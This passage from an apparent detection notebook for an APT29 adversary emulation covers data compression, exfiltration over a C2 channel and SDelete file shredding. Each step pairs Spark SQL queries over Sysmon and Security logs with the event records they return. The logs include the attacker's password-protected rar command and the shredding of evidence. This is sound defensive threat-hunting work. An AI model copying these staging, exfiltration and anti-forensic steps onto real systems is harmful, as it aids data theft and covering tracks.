<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x89177D

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xbc
	New Process Name:	C:\Windows\Temp\Rar.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x130c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	&quot;C:\Windows\Temp\Rar.exe&quot; a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-7-data-compressed">
<h2>9.B.7. Data Compressed<a class="headerlink" href="#b-7-data-compressed" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Compressed staged ZIP (working.zip in AppData directory) into working.zip (on Desktop) using rar.exe</p>
<p><strong>Criteria:</strong> powershell.exe executing rar.exe</p>
<div class="section" id="id71">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id71" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:FD1AE986-FD91-4B91-8BCE-42C9295949F7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ParentProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND h.EventID = 1</span>
<span class="sd">    AND LOWER(h.CommandLine) LIKE &quot;%rar.exe%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:16:19.395
ProcessGuid: {5aa8ec29-e603-5eac-7b03-000000000400}
ProcessId: 188
Image: C:\Windows\Temp\Rar.exe
FileVersion: 5.71.0
Description: Command line RAR
Product: WinRAR
Company: Alexander Roshal
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\Rar.exe&quot; a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
CurrentDirectory: C:\Windows\Temp\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e5b7-5eac-7d17-890000000000}
LogonId: 0x89177D
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=FBFAA0AA1E0F6BE9987F896AF5F15B593EE1AD50,MD5=B891917AA5F7E2E9806F2BECEBE7C77B,SHA256=26D9212EC8DBCA45383EB95EC53C05357851BD7529FA0761D649F62E90C4E9FD,IMPHASH=B6CF226307A5F95763025E2880CDD028
ParentProcessGuid: {5aa8ec29-e5e4-5eac-7a03-000000000400}
ParentProcessId: 4876
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:8A865709-E762-4A26-BDEC-A762FB37947B</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.NewProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT d.NewProcessId</span>
<span class="sd">        FROM apt29Host d</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">            SELECT b.NewProcessId</span>
<span class="sd">            FROM apt29Host b</span>
<span class="sd">            INNER JOIN (</span>
<span class="sd">              SELECT NewProcessId</span>
<span class="sd">              FROM apt29Host</span>
<span class="sd">              WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">                  AND EventID = 4688</span>
<span class="sd">                  AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">            ) a</span>
<span class="sd">            ON b.ProcessId = a.NewProcessId</span>
<span class="sd">            WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">              AND NewProcessName LIKE &#39;%python.exe&#39;</span>
<span class="sd">        ) c</span>
<span class="sd">        ON d.ProcessId = c.NewProcessId</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ProcessId = e.NewProcessId</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessId = g.NewProcessId</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND h.EventID = 4688</span>
<span class="sd">    AND LOWER(h.CommandLine) LIKE &quot;%rar.exe%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x89177D

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xbc
	New Process Name:	C:\Windows\Temp\Rar.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x130c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	&quot;C:\Windows\Temp\Rar.exe&quot; a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-8-exfiltration-over-command-and-control-channel">
<h2>9.B.8. Exfiltration Over Command and Control Channel<a class="headerlink" href="#b-8-exfiltration-over-command-and-control-channel" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Read and downloaded ZIP (working.zip on Desktop) over C2 channel (192.168.0.5 over TCP port 8443)</p>
<p><strong>Criteria:</strong> python.exe reading the file working.zip while connected to the C2 channel</p>
<div class="section" id="id72">
<h3>Detection Type:None(None)<a class="headerlink" href="#id72" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="c-1-file-deletion">
<h2>9.C.1. File Deletion<a class="headerlink" href="#c-1-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted rar.exe on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file rar.exe</p>
<div class="section" id="id73">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id73" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:C20D8999-0B0D-4A50-9CDC-2BAAC4C7B577</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host j</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT h.ProcessGuid</span>
<span class="sd">    FROM apt29Host h</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT f.ProcessGuid</span>
<span class="sd">        FROM apt29Host f</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT d.ProcessGuid</span>
<span class="sd">          FROM apt29Host d</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">              SELECT b.ProcessGuid</span>
<span class="sd">              FROM apt29Host b</span>
<span class="sd">              INNER JOIN (</span>
<span class="sd">                SELECT ProcessGuid</span>
<span class="sd">                FROM apt29Host</span>
<span class="sd">                WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                    AND EventID = 1</span>
<span class="sd">                    AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">              ) a</span>
<span class="sd">              ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">              WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">          ) c</span>
<span class="sd">          ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">        ) e</span>
<span class="sd">        ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND Image LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">    ) g</span>
<span class="sd">    ON h.ParentProcessGuid = g.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND h.EventID = 1</span>
<span class="sd">) i</span>
<span class="sd">ON j.ProcessGuid = i.ProcessGuid</span>
<span class="sd">WHERE j.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND j.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:41.353
ProcessGuid: {5aa8ec29-e655-5eac-8303-000000000400}
ProcessId: 6640
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\Desktop\working.zip
Hashes: SHA1=321A74E1D43B00DF8D3D4A55CE36C5E7A143A5C4,MD5=14C4E1AB76CF430C499E8509CA488F54,SHA256=1125328F7A204931E2E22C5BBE7238E382B35C1456F6961B1EF8566C5EE06863,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00         
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:18.102
ProcessGuid: {5aa8ec29-e63e-5eac-8203-000000000400}
ProcessId: 6116
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\ZZZZZZZZZZZZZZZZZZZZZZZ.ZZZ
Hashes: SHA1=61A5FFA57DFE0D9B3E4938439FF3452109D4E709,MD5=58B9030861D1CC69344164EE048D9ABC,SHA256=DD4969A104193430D250956C52C2498786C4922361D306B9CBB0148F69C1339C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:16:52.587
ProcessGuid: {5aa8ec29-e624-5eac-7f03-000000000400}
ProcessId: 3552
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Windows\Temp\Rar.exe
Hashes: SHA1=408238F3BEA1DF74E8B9B672E8F95C5BA2C5DBC0,MD5=FD021D31F1DFA5E00EFA035758023064,SHA256=8FD96796FCDB8CAC8DB026C2C78E24493507CEDC500E358B1564F184DA18D94C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00                      
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-2-file-deletion">
<h2>9.C.2. File Deletion<a class="headerlink" href="#c-2-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted working.zip (from Desktop) on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file \Desktop\working.zip</p>
<div class="section" id="id74">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id74" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:CB869916-7BCF-4F9F-8B95-C19B407B91E3</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host j</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT h.ProcessGuid</span>
<span class="sd">    FROM apt29Host h</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT f.ProcessGuid</span>
<span class="sd">        FROM apt29Host f</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT d.ProcessGuid</span>
<span class="sd">          FROM apt29Host d</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">              SELECT b.ProcessGuid</span>
<span class="sd">              FROM apt29Host b</span>
<span class="sd">              INNER JOIN (</span>
<span class="sd">                SELECT ProcessGuid</span>
<span class="sd">                FROM apt29Host</span>
<span class="sd">                WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                    AND EventID = 1</span>
<span class="sd">                    AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">              ) a</span>
<span class="sd">              ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">              WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">          ) c</span>
<span class="sd">          ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">        ) e</span>
<span class="sd">        ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND Image LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">    ) g</span>
<span class="sd">    ON h.ParentProcessGuid = g.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND h.EventID = 1</span>
<span class="sd">) i</span>
<span class="sd">ON j.ProcessGuid = i.ProcessGuid</span>
<span class="sd">WHERE j.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND j.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:41.353
ProcessGuid: {5aa8ec29-e655-5eac-8303-000000000400}
ProcessId: 6640
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\Desktop\working.zip
Hashes: SHA1=321A74E1D43B00DF8D3D4A55CE36C5E7A143A5C4,MD5=14C4E1AB76CF430C499E8509CA488F54,SHA256=1125328F7A204931E2E22C5BBE7238E382B35C1456F6961B1EF8566C5EE06863,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00         
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:18.102
ProcessGuid: {5aa8ec29-e63e-5eac-8203-000000000400}
ProcessId: 6116
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\ZZZZZZZZZZZZZZZZZZZZZZZ.ZZZ
Hashes: SHA1=61A5FFA57DFE0D9B3E4938439FF3452109D4E709,MD5=58B9030861D1CC69344164EE048D9ABC,SHA256=DD4969A104193430D250956C52C2498786C4922361D306B9CBB0148F69C1339C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:16:52.587
ProcessGuid: {5aa8ec29-e624-5eac-7f03-000000000400}
ProcessId: 3552
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Windows\Temp\Rar.exe
Hashes: SHA1=408238F3BEA1DF74E8B9B672E8F95C5BA2C5DBC0,MD5=FD021D31F1DFA5E00EFA035758023064,SHA256=8FD96796FCDB8CAC8DB026C2C78E24493507CEDC500E358B1564F184DA18D94C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00                      
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-3-file-deletion">
<h2>9.C.3. File Deletion<a class="headerlink" href="#c-3-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted working.zip (from AppData directory) on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file \AppData\Roaming\working.zip</p>
<div class="section" id="id75">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id75" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:59F37185-0BE4-4D81-8B81-FBFBD8055587</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host j</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT h.ProcessGuid</span>
<span class="sd">    FROM apt29Host h</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT f.ProcessGuid</span>
<span class="sd">        FROM apt29Host f</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT d.ProcessGuid</span>
<span class="sd">          FROM apt29Host d</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">              SELECT b.ProcessGuid</span>
<span class="sd">              FROM apt29Host b</span>
<span class="sd">              INNER JOIN (</span>
<span class="sd">                SELECT ProcessGuid</span>
<span class="sd">                FROM apt29Host</span>
<span class="sd">                WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                    AND EventID = 1</span>
<span class="sd">                    AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">              ) a</span>
<span class="sd">              ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">              WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">          ) c</span>
<span class="sd">          ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">        ) e</span>
<span class="sd">        ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND Image LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">    ) g</span>
<span class="sd">    ON h.ParentProcessGuid = g.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND h.EventID = 1</span>
<span class="sd">) i</span>
<span class="sd">ON j.ProcessGuid = i.ProcessGuid</span>
<span class="sd">WHERE j.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND j.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:41.353
ProcessGuid: {5aa8ec29-e655-5eac-8303-000000000400}
ProcessId: 6640
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\Desktop\working.zip
Hashes: SHA1=321A74E1D43B00DF8D3D4A55CE36C5E7A143A5C4,MD5=14C4E1AB76CF430C499E8509CA488F54,SHA256=1125328F7A204931E2E22C5BBE7238E382B35C1456F6961B1EF8566C5EE06863,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00         
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:18.102
ProcessGuid: {5aa8ec29-e63e-5eac-8203-000000000400}
ProcessId: 6116
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Users\pbeesly\ZZZZZZZZZZZZZZZZZZZZZZZ.ZZZ
Hashes: SHA1=61A5FFA57DFE0D9B3E4938439FF3452109D4E709,MD5=58B9030861D1CC69344164EE048D9ABC,SHA256=DD4969A104193430D250956C52C2498786C4922361D306B9CBB0148F69C1339C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
